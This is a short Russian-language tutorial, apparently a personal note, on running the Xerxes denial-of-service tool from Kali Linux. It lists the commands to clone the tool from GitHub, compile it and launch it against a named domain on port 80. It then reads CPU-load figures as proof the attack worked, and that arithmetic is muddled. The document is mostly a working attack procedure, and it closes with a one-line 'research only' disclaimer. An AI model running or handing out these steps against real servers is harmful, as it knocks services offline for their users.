 XERXES – самый мощный инструмент для DoS-атаки с использованием [[Kali Linux]]
-- Как использовать Xerxes при запуске атаки DOS.

Инструменты DDOS способны создавать большие нагрузки на HTTP-серверы и вызывать большую нагрузку на ресурсы серверов.

Что такое DOS-атака?
Тип атаки, которая флудит серверы или сети, что приводит к тому, что источник недоступен для конечных пользователей.

Xerxes – это простой мощный инструмент для DoS-атаки с использованием Kali Linux

Используйте Xerxes из Github для этого выполните следующие команды:

``` bash
git clone https://github.com/XCHADXFAQ77X/XERXES.git
```
Затем перейдите в директорию.

```
cd xerxes
```

Далее вы должны скомпилировать с помощью GNU GCC

``` bash
gcc xerxes.c -o xerxes
```

Чтобы начать атаку укажите IP-адрес либо домен и порт. Например:

``` bash
./xerxes tsarev.biz 80
```

![[Pasted image 20241006120824.png]]
![[Pasted image 20241006120838.png]]

## Как видеть результат атаки, возросшая нагрузка на процессор?

Значение `us (user space)` составляет 5.9%, а `sy (system space)` — 4.8% на двухядерном процессоре, это может означать следующее:


   - Для двухядерного процессора максимальное использование CPU составляет 200% (100% на каждое ядро).
   - В вашем случае, общее использование CPU можно оценить как сумму `us` и `sy`:
     - `us + sy = 5.9% + 4.8% = 10.7%`
   - Это означает, что в данный момент ваш процессор используется на 10.7% от его общей мощности.

### Заключение

В данный момент нагрузка увеличилась на 10.7% 


![[Pasted image 20241006120859.png]]



❗ Примечание: Информация только для исследования, обучения или проведения аудита. Применение в корыстных целях карается законом.